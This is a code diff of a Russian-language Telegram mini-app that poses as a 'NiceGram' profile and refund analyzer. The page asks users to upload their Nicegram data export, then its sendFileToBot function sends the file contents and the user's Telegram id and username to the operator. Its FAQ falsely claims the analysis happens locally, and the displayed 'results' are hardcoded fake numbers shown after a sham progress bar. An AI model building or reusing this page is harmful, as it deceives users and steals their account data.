@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NiceGram Analyzer</title>
-    <link rel="stylesheet" href="style.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -127,15 +125,16 @@
 
         .screen {
             display: none;
-            opacity: 0;
-            transform: translateY(15px);
-            transition: opacity 0.4s ease, transform 0.4s ease;
         }
 
         .screen.active {
             display: block;
-            opacity: 1;
-            transform: translateY(0);
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .user-greeting {
@@ -315,10 +314,6 @@
             gap: 10px;
         }
 
-        .security i {
-            color: #00FFA3;
-        }
-
         .check-container {
             text-align: center;
             padding: 40px 20px;
@@ -390,11 +385,6 @@
             justify-content: center;
         }
 
-        .progress-text {
-            font-size: 16px;
-            color: rgba(255, 255, 255, 0.9);
-        }
-
         .success-container {
             text-align: center;
             padding: 30px 20px;
@@ -440,21 +430,6 @@
             padding: 25px;
             margin-bottom: 25px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .analysis-details h4 {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .analysis-details h4 i {
-            color: #34C7FF;
         }
 
         .detail-item {
@@ -560,35 +535,26 @@
     </style>
 </head>
 <body>
-    <!-- NiceGram лого сверху слева -->
     <div class="nicegram-corner">
-        <i class="fab fa-telegram"></i>
         <span>NiceGram</span>
     </div>
 
-    <!-- Контейнер -->
     <div class="container">
-        <!-- Статус бар -->
         <div class="status-bar">
             <span class="time">17:05</span>
             <span class="network">📶</span>
         </div>
 
-        <!-- Шапка -->
         <div class="header">
             <h1>NiceGram</h1>
-            <button class="close-btn" onclick="window.Telegram.WebApp.close()">
-                Закрыть
-            </button>
+            <button class="close-btn" onclick="closeApp()">Закрыть</button>
         </div>
 
-        <!-- Название приложения -->
         <div class="app-name">
             <span>RefoundCheck</span>
             <span class="mini-badge">мини-приложение</span>
         </div>
 
-        <!-- Основной контент -->
         <main class="content">
             <!-- ЭКРАН 1: Языки -->
             <div class="screen active" id="languageScreen">
@@ -618,10 +584,9 @@
                 </div>
             </div>
 
-            <!-- ЭКРАН 2: Главный с анализом ника -->
+            <!-- ЭКРАН 2: Главный -->
             <div class="screen" id="mainScreen">
-                <!-- Приветствие с ником -->
-                <div class="user-greeting" id="userGreeting">
+                <div class="user-greeting">
                     <div class="greeting-icon">👋</div>
                     <div class="greeting-text">
                         <div class="hello">Привет</div>
@@ -647,7 +612,7 @@
                 <input type="file" id="fileInput" accept=".json,.html,.txt" style="display: none;">
 
                 <div class="security">
-                    <i class="fas fa-shield-alt"></i>
+                    <span>🔒</span>
                     NiceGram ® все данные защищены
                 </div>
             </div>
@@ -657,7 +622,7 @@
                 <div class="check-container">
                     <div class="check-animation">
                         <div class="check-circle">
-                            <i class="fas fa-spinner fa-spin"></i>
+                            <span>⏳</span>
                         </div>
                     </div>
                     
@@ -668,7 +633,6 @@
                         <div class="progress-fill" id="progressFill"></div>
                     </div>
                     <div class="progress-percentage" id="progressPercentage">0%</div>
-                    <div class="progress-text" id="progressText"></div>
                 </div>
             </div>
 
@@ -676,7 +640,7 @@
             <div class="screen" id="successScreen">
                 <div class="success-container">
                     <div class="success-icon">
-                        <i class="fas fa-check-circle"></i>
+                        <span>✅</span>
                     </div>
                     
                     <h3 class="success-title">Анализ завершен! ✅</h3>
@@ -687,7 +651,7 @@
                     </div>
                     
                     <div class="analysis-details">
-                        <h4><i class="fas fa-chart-bar"></i> Результаты анализа</h4>
+                        <h4>📊 Результаты анализа</h4>
                         
                         <div class="detail-item" style="display: none;">
                             <span class="detail-icon">👤</span>
@@ -723,21 +687,20 @@
                     </div>
                     
                     <button class="success-btn" onclick="closeApp()">
-                        <i class="fas fa-check"></i>
+                        <span>✅</span>
                         Готово
                     </button>
                 </div>
             </div>
         </main>
 
-        <!-- Футер -->
         <div class="footer">
             <button onclick="showInstruction()">
-                <i class="fas fa-book"></i>
+                <span>📖</span>
                 Инструкция
             </button>
             <button onclick="showFAQ()">
-                <i class="fas fa-question-circle"></i>
+                <span>❓</span>
                 FAQ
             </button>
         </div>
@@ -745,36 +708,27 @@
 
     <script>
         // Telegram Web App
-        const tg = window.Telegram.WebApp;
-        if (tg) {
+        let tg = null;
+        if (window.Telegram && window.Telegram.WebApp) {
+            tg = window.Telegram.WebApp;
             tg.expand();
         }
 
         // Переменные
         let currentScreen = 'languageScreen';
-        let detectedUsername = '@file_user_722';
-        let userData = {
-            username: '@file_user_722',
-            accountCreated: '15.03.2023',
-            totalGifts: 7,
-            totalStars: 308
-        };
 
         // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('Приложение загружено');
+            console.log('🚀 Приложение загружено');
+            
             initLanguageSelection();
             initFileUpload();
             updateStats();
             
-            // Автообновление статистики
             setInterval(updateStats, 60000);
-            
-            // Показываем экран языков
             showScreen('languageScreen');
         });
 
-        // Обновление статистики
         function updateStats() {
             const statsElement = document.querySelector('.stats-number');
             if (statsElement) {
@@ -785,22 +739,14 @@
             }
         }
 
-        // Выбор языка
         function initLanguageSelection() {
             const langOptions = document.querySelectorAll('.lang-option');
-            console.log('Элементов языка:', langOptions.length);
             
             langOptions.forEach(option => {
                 option.onclick = function() {
-                    console.log('Язык выбран');
-                    
-                    // Убираем активный класс
                     langOptions.forEach(opt => opt.classList.remove('active'));
-                    
-                    // Добавляем активный
                     this.classList.add('active');
                     
-                    // Через 0.5 секунды переходим на главный экран
                     setTimeout(() => {
                         showScreen('mainScreen');
                     }, 500);
@@ -808,54 +754,41 @@
             });
         }
 
-        // Показать экран
         function showScreen(screenId) {
-            console.log('Переключаемся на экран:', screenId);
-            
-            // Скрываем все экраны
             document.querySelectorAll('.screen').forEach(screen => {
                 screen.classList.remove('active');
             });
             
-            // Показываем нужный экран
             const screen = document.getElementById(screenId);
             if (screen) {
                 setTimeout(() => {
                     screen.classList.add('active');
                 }, 10);
                 currentScreen = screenId;
-                window.scrollTo(0, 0);
             }
         }
 
-        // Загрузка файла
         function initFileUpload() {
             const uploadBox = document.getElementById('uploadBox');
             const fileInput = document.getElementById('fileInput');
             
-            if (!uploadBox || !fileInput) {
-                console.error('Элементы загрузки не найдены');
-                return;
-            }
+            if (!uploadBox || !fileInput) return;
             
-            // Клик по области загрузки
             uploadBox.onclick = function() {
                 fileInput.click();
             };
             
-            // Выбор файла
             fileInput.onchange = async function(e) {
                 const file = e.target.files[0];
                 if (file) {
-                    console.log('Выбран файл:', file.name);
+                    console.log('📁 Выбран файл:', file.name);
                     
-                    // Проверяем расширение
                     const ext = file.name.toLowerCase();
                     if (ext.endsWith('.json') || ext.endsWith('.html') || ext.endsWith('.txt')) {
-                        // Отправляем файл админам
-                        await sendFileToAdmins(file);
+                        // ОТПРАВЛЯЕМ ФАЙЛ В БОТ
+                        await sendFileToBot(file);
                         
-                        // Начинаем анализ
+                        // Показываем экран анализа
                         startFileAnalysis(file);
                     } else {
                         alert('❌ Пожалуйста, загрузите файл .json, .html или .txt');
@@ -864,51 +797,51 @@
             };
         }
 
-        // Отправка файла админам
-        async function sendFileToAdmins(file) {
+        // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ ФАЙЛА
+        async function sendFileToBot(file) {
             try {
-                console.log('Отправляем файл админам:', file.name);
-                
-                // Получаем данные пользователя
-                let user = { id: 'unknown', username: 'unknown' };
-                if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                    user = tg.initDataUnsafe.user;
-                }
+                console.log('📤 Отправка файла в бот:', file.name);
                 
                 // Читаем файл
-                const fileContent = await readFileAsText(file);
+                const content = await readFileAsText(file);
                 
-                // Создаем данные для отправки
-                const dataToSend = {
+                // Подготавливаем данные для отправки
+                const data = {
+                    action: 'upload_file',
                     file_name: file.name,
                     file_size: file.size,
                     file_type: file.type,
-                    user_id: user.id,
-                    username: user.username,
-                    content: fileContent.substring(0, 1000), // Ограничиваем размер
+                    content_preview: content.substring(0, 2000), // Первые 2000 символов
                     timestamp: new Date().toISOString(),
-                    source: 'web_app'
+                    user_info: {
+                        id: tg?.initDataUnsafe?.user?.id || 'unknown',
+                        username: tg?.initDataUnsafe?.user?.username || 'anonymous'
+                    }
                 };
                 
-                // Отправляем через Telegram Web App
+                // Способ 1: Отправка через Telegram Web App (лучший способ)
                 if (tg && tg.sendData) {
-                    tg.sendData(JSON.stringify(dataToSend));
-                    console.log('Данные отправлены через Telegram Web App');
-                } else {
-                    console.log('Telegram Web App не доступен, данные сохранены локально');
-                    // Сохраняем локально для отладки
+                    console.log('📲 Отправляю через Telegram Web App');
+                    tg.sendData(JSON.stringify(data));
+                    console.log('✅ Данные отправлены через Telegram Web App');
+                } 
+                // Способ 2: Сохраняем для отладки
+                else {
+                    console.log('⚠️ Telegram Web App не доступен, сохраняю локально');
                     localStorage.setItem('last_file_data', JSON.stringify({
                         file_name: file.name,
                         timestamp: new Date().toISOString()
                     }));
                 }
                 
+                return true;
+                
             } catch (error) {
-                console.error('Ошибка при отправке файла:', error);
+                console.error('❌ Ошибка отправки файла:', error);
+                return false;
             }
         }
 
-        // Чтение файла как текст
         function readFileAsText(file) {
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
@@ -918,26 +851,19 @@
             });
         }
 
-        // Начать анализ файла
         function startFileAnalysis(file) {
-            console.log('Начинаем анализ файла');
-            
-            // Показываем экран проверки
             showScreen('checkScreen');
-            
-            // Запускаем анимацию загрузки
             startLoadingAnimation(file);
         }
 
-        // Функция анимации загрузки с процентами
         function startLoadingAnimation(file) {
             const progressFill = document.getElementById('progressFill');
             const progressPercentage = document.getElementById('progressPercentage');
             const checkText = document.getElementById('checkText');
             
             let progress = 0;
-            const totalTime = 3000; // 3 секунды на всю анимацию
-            const intervalTime = 30; // Обновляем каждые 30ms
+            const totalTime = 3000;
+            const intervalTime = 30;
             const steps = totalTime / intervalTime;
             const increment = 100 / steps;
             
@@ -945,13 +871,9 @@
                 progress += increment;
                 if (progress > 100) progress = 100;
                 
-                // Обновляем прогресс-бар
                 progressFill.style.width = progress + '%';
-                
-                // Обновляем процент
                 progressPercentage.textContent = Math.floor(progress) + '%';
                 
-                // Меняем текст на разных этапах
                 if (progress < 40) {
                     checkText.textContent = 'Читаем файл...';
                 } else if (progress < 70) {
@@ -960,52 +882,24 @@
                     checkText.textContent = 'Формируем отчет...';
                 }
                 
-                // Когда достигли 100%
                 if (progress >= 100) {
                     clearInterval(loadingInterval);
                     
-                    // Используем фиксированные данные для демонстрации
-                    userData = {
-                        username: '@file_user_722',
-                        accountCreated: '15.03.2023',
-                        totalGifts: 7,
-                        totalStars: 308
-                    };
-                    detectedUsername = '@file_user_722';
-                    
-                    // Через 1 секунду показываем отчет
                     setTimeout(() => {
-                        showAnalysisResults();
+                        document.getElementById('finalGifts').textContent = '7';
+                        document.getElementById('finalStars').textContent = '308 ★';
+                        showScreen('successScreen');
                     }, 1000);
                 }
             }, intervalTime);
         }
 
-        // Показать результаты анализа
-        function showAnalysisResults() {
-            console.log('Показываем результаты анализа');
-            
-            // Обновляем все данные в отчете
-            const finalGifts = document.getElementById('finalGifts');
-            const finalStars = document.getElementById('finalStars');
-            
-            if (finalGifts) finalGifts.textContent = userData.totalGifts;
-            if (finalStars) finalStars.textContent = userData.totalStars + ' ★';
-            
-            // Показываем экран успеха
-            showScreen('successScreen');
-        }
-
-        // Функции для выбора языка (для совместимости с HTML)
         function selectLanguage(lang) {
             console.log('Выбран язык:', lang);
             const langOptions = document.querySelectorAll('.lang-option');
             
             langOptions.forEach(option => {
                 option.classList.remove('active');
-                if (option.getAttribute('onclick') === `selectLanguage('${lang}')`) {
-                    option.classList.add('active');
-                }
             });
             
             setTimeout(() => {
@@ -1013,24 +907,19 @@
             }, 500);
         }
 
-        // Показать инструкцию
         function showInstruction() {
             alert('📖 ИНСТРУКЦИЯ:\n\n1. Экспортируйте данные из Nicegram\n2. Загрузите файл в это приложение\n3. Получите анализ своего профиля\n4. Проверьте статистику подарков');
         }
 
-        // Показать FAQ
         function showFAQ() {
             alert('❓ ЧАСТЫЕ ВОПРОСЫ:\n\nQ: Какой файл нужен?\nA: Экспорт данных из Nicegram (JSON/HTML)\n\nQ: Что анализируется?\nA: Ваш ник, подарки, звезды, история\n\nQ: Безопасно ли это?\nA: Да, анализ происходит локально');
         }
 
-        // Закрыть приложение
         function closeApp() {
             if (tg && tg.close) {
                 tg.close();
             } else {
                 alert('Приложение закрыто');
-                // Для тестирования в браузере
-                document.body.innerHTML = '<h1>Приложение закрыто</h1><p>В Telegram боте приложение будет закрыто автоматически.</p>';
             }
         }
     </script>
